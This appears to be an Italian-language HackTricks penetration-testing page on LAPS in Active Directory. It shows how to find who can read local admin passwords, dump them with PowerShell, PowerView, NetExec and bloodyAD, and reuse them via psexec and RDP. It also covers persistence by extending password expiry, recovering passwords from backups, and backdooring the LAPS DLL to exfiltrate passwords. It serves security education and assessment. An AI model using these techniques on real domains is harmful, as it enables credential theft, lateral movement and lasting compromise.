# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Attualmente ci sono **2 varianti di LAPS** che puoi incontrare durante un assessment:

- **Legacy Microsoft LAPS**: memorizza la password dell’admin locale in **`ms-Mcs-AdmPwd`** e il tempo di scadenza in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrato in Windows dalle update di aprile 2023): può ancora emulare la legacy mode, ma in native mode usa attributi **`msLAPS-*`**, supporta **password encryption**, **password history** e **DSRM password backup** per i domain controllers.

LAPS è progettato per gestire le **password dell’admin locale**, rendendole **uniche, casuali e cambiate frequentemente** sui computer joined al domain. Se riesci a leggere quegli attributi, di solito puoi **pivot as the local admin** verso l’host interessato. In molti ambienti, la parte interessante non è solo leggere la password stessa, ma anche scoprire **a chi è stato delegato l’accesso** agli attributi della password.

### Legacy Microsoft LAPS attributes

Negli oggetti computer del domain, l’implementazione di legacy Microsoft LAPS comporta l’aggiunta di due attributi:

- **`ms-Mcs-AdmPwd`**: **password dell’admin in chiaro**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tempo di scadenza della password**

### Windows LAPS attributes

Native Windows LAPS aggiunge diversi nuovi attributi agli oggetti computer:

- **`msLAPS-Password`**: blob di password in clear-text memorizzato come JSON quando encryption non è abilitata
- **`msLAPS-PasswordExpirationTime`**: tempo di scadenza pianificato
- **`msLAPS-EncryptedPassword`**: password corrente cifrata
- **`msLAPS-EncryptedPasswordHistory`**: cronologia delle password cifrata
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dati cifrati della password DSRM per i domain controllers
- **`msLAPS-CurrentPasswordVersion`**: tracciamento della versione basato su GUID usato dalla logica più recente di rilevamento rollback (schema forest di Windows Server 2025)

Quando **`msLAPS-Password`** è leggibile, il valore è un oggetto JSON che contiene il nome dell’account, l’orario di aggiornamento e la password in clear-text, ad esempio:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifica se è attivato
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Accesso alla password LAPS

Puoi **scaricare la policy LAPS grezza** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e poi usare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile dall'uomo.

### Cmdlet PowerShell legacy di Microsoft LAPS

Se il modulo LAPS legacy è installato, i seguenti cmdlet sono di solito disponibili:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlet PowerShell di Windows LAPS

Windows LAPS nativo include un nuovo modulo PowerShell e nuovi cmdlet:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Alcuni dettagli operativi contano qui:

- **`Get-LapsADPassword`** gestisce automaticamente **legacy LAPS**, **clear-text Windows LAPS** e **encrypted Windows LAPS**.
- Se la password è encrypted e puoi **read** ma non **decrypt** it, il cmdlet restituisce metadati come **`Source`**, **`DecryptionStatus`** e **`AuthorizedDecryptor`** anche quando non può restituire la clear-text password.
- In **encrypted Windows LAPS**, **read permission** e **decrypt permission** sono **controlli diversi**. Avere accesso read a OU / oggetto non significa automaticamente poter decrypt **`msLAPS-EncryptedPassword`**.
- La **password history** è disponibile solo quando è abilitata la **Windows LAPS encryption**.
- Sui domain controllers, la source restituita può essere **`EncryptedDSRMPassword`**.

Questo è utile durante un assessment perché il campo **`AuthorizedDecryptor`** ti dice **per quale user o group è stato encrypted il blob**, spesso trasformando una lettura password fallita in un nuovo target di privilege-escalation.

### PowerView / LDAP

**PowerView** può essere usato anche per scoprire **chi può leggere la password e leggerla**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** è leggibile, analizza il JSON restituito ed estrai **`p`** per la password e **`n`** per il nome dell’account admin locale gestito.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Quel campo **`n`** conta nelle distribuzioni più recenti perché la **gestione automatica dell'account di Windows LAPS** può puntare a un **account personalizzato** invece che al built-in **`Administrator`**, e i sistemi più recenti **Windows 11 24H2 / Windows Server 2025** possono persino **randomizzare** il nome di quell'account.

### Linux / remote tooling

Gli strumenti moderni supportano sia il legacy Microsoft LAPS sia Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Note:

- Le build recenti di **NetExec** supportano **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** è ancora utile per il **legacy Microsoft LAPS** da Linux, ma supporta solo **`ms-Mcs-AdmPwd`**.
- Tool cross-platform più recenti come **`LAPS4LINUX`**, tool basati su **`dpapi-ng`** e i workflow recenti di **NetExec** possono gestire anche **native Windows LAPS** da host non-Windows.
- Se l'ambiente usa **encrypted Windows LAPS**, una semplice lettura LDAP non basta; devi anche essere un **authorized decryptor** (o avere materiale di decryption equivalente, come il materiale offline della root key DPAPI-NG del domain).
- Su **Windows 11 24H2 / Windows Server 2025**, non assumere che l'account admin locale gestito sia sempre **`Administrator`**. La gestione automatica dell'account può creare un account personalizzato e opzionalmente randomizzarne il nome, quindi scopri prima il nome dell'account tramite **`n`** / **`Account`** prima di usare **`--laps`** su larga scala.

### Directory synchronization abuse

Se hai diritti di **directory synchronization** a livello di domain invece dell'accesso diretto in lettura su ogni computer object, LAPS può comunque essere interessante.

La combinazione di **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** può essere usata per sincronizzare attributi **confidential / RODC-filtered** come il legacy **`ms-Mcs-AdmPwd`**. BloodHound modella questo come **`SyncLAPSPassword`**. Controlla [DCSync](dcsync.md) per il background sui replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l'enumeration di LAPS con diverse funzioni.\
Una di queste è il parsing di **`ExtendedRights`** per **tutti i computer con LAPS abilitato.** Questo mostra i **group** specificamente **delegati a leggere le password LAPS**, che spesso sono utenti in group protetti.\
Un **account** che ha **joined** un computer a un domain riceve `All Extended Rights` su quell'host, e questo right dà all'**account** la capacità di **leggere le password**. L'enumeration può mostrare un account utente che può leggere la password LAPS su un host. Questo può aiutarci a **target specifici AD user** che possono leggere le password LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Se non hai una PowerShell interattiva, puoi abusare di questo privilegio da remoto tramite LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Questo scarica tutti i segreti LAPS che l'utente può leggere, consentendoti di muoverti lateralmente con una password di amministratore locale diversa.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistenza LAPS

### Data di scadenza

Una volta admin, è possibile **ottenere le password** e **impedire** a una macchina di **aggiornare** la propria **password** impostando la data di scadenza nel futuro.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS usa invece **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La password ruoterà comunque se un **admin** usa **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, oppure se **Do not allow password expiration time longer than required by policy** è abilitato.

### Snapshot rollback caveat on newer Windows LAPS

I vecchi trucchi di snapshot / image rollback sono **meno affidabili** contro le recenti distribuzioni di **Windows LAPS**. Su **Windows 11 24H2 / Windows Server 2025**, se lo schema del forest include **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), il client confronta un GUID memorizzato in locale con il valore salvato in AD e **ruota immediatamente la password** quando un rollback crea uno **torn state**.

In pratica, questo significa che la persistenza basata su snapshot o i tentativi di resuscitare una vecchia password locale nota possono fallire rapidamente invece di sopravvivere fino alla normale scadenza successiva.

Questa protezione si applica solo a **AD-backed Windows LAPS** e dipende ancora dal fatto che la macchina ripristinata possa **autenticarsi di nuovo su AD**. Se la macchina non riesce più a parlare con AD, **password history** o **AD backup access** potrebbero ancora salvare la situazione.

### Automatic account management tamper caveat

Quando **automatic account management** è abilitato, Windows LAPS gestisce il ciclo di vita dell'account admin locale gestito. Tentativi imprevisti di rinominare, riconfigurare o comunque alterare quell'account possono essere rifiutati con **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, quindi la persistenza che dipende dalla modifica silenziosa dell'account LAPS gestito è meno affidabile sugli endpoint più recenti.

### Recovering historical passwords from AD backups

Quando **Windows LAPS encryption + password history** è abilitato, i backup AD montati possono diventare un'ulteriore fonte di secret. Se puoi accedere a uno snapshot AD montato e usare la **recovery mode**, puoi interrogare le vecchie password archiviate senza parlare con un DC live.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Questo è principalmente rilevante durante **AD backup theft**, **offline forensics abuse** o **disaster-recovery media access**.

### Backdoor

Il codice sorgente originale per il legacy Microsoft LAPS si trova [qui](https://github.com/GreyCorbel/admpwd), quindi è possibile inserire una backdoor nel codice (ad esempio dentro il metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`) che in qualche modo **exfiltrate new passwords o li memorizzi da qualche parte**.

Poi, compila il nuovo `AdmPwd.PS.dll` e caricalo sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e cambia il modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
